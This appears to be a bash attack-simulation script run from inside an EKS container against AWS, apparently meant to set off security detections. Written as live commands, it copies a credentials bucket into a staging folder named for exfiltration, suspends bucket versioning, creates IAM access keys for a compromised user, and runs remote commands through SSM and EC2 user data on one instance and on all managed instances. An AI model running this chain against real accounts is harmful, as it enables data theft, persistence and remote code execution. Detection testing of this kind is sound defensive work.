#!/bin/bash
set -x

export HOME=/root
export LC_ALL=C

if [[ -z "${BUCKET_NAME}" ]]; then
  BUCKET_NAME="creds-storage-internal"
fi

if [[ -z "${COMPROMISED_USER_NAME}" ]]; then
  COMPROMISED_USER_NAME="lior-admin"
fi

if [[ -z "${SSM_VICTIM_INSTANCE_ID}" ]]; then
  MODIFY_ATTRIBUTE_INSTANCE="i-00817ceafaa4e7b35"
  SSM_ENABLED_INSTANCE="i-0fb0146c3be44b6e7"
  REGION="us-west-2"
else
  MODIFY_ATTRIBUTE_INSTANCE="$SSM_VICTIM_INSTANCE_ID"
  SSM_ENABLED_INSTANCE="$SSM_VICTIM_INSTANCE_ID"
  REGION="$AWS_REGION"
fi

# Enumeration and data exfiltration attempt from S3 bucket with sensitive data originated from an EKS container
aws s3 ls
aws s3 cp s3://$BUCKET_NAME ./3xf1l-5t4ging --recursive

# Issue bucket modification request
aws s3api put-bucket-versioning --bucket $BUCKET_NAME --versioning-configuration Status=Suspended

# Privilege escalation attempts locally and in the cloud originated from an EKS container
sudo su <<EOF
exit
EOF
aws iam create-access-key --user-name $COMPROMISED_USER_NAME

# Enumeration and RCE execution on instance(s) using SSM originated from an EKS container
aws ec2 describe-instances --region $REGION
aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["bash -c \"echo You Got Hacked!\""]' --targets "Key=instanceids,Values=$SSM_ENABLED_INSTANCE" --comment "This is a malicious command" --region $REGION

# Enumeration and RCE execution on instance(s) using the EC2 UserData attribute originated from an EKS container
aws ec2 describe-instances --region $REGION
aws ec2 modify-instance-attribute --instance-id=$MODIFY_ATTRIBUTE_INSTANCE --user-data Value=$(base64 -i /root/UserData.txt) --region $REGION

# RCE execution attempt on all SSM managed instances originated from an EKS container
aws ssm create-association --name "AWS-RunShellScript" --targets "Key=instanceids,Values=*" --parameters 'commands=["bash -c \"echo You Got Hacked!\""]' --region $REGION

# Enumeration and interactive connection using SSM to an instance originated from an EKS container
aws ec2 describe-instances --region $REGION
aws ssm start-session --target $SSM_ENABLED_INSTANCE --region $REGION &
sleep 10 && pkill -9 aws
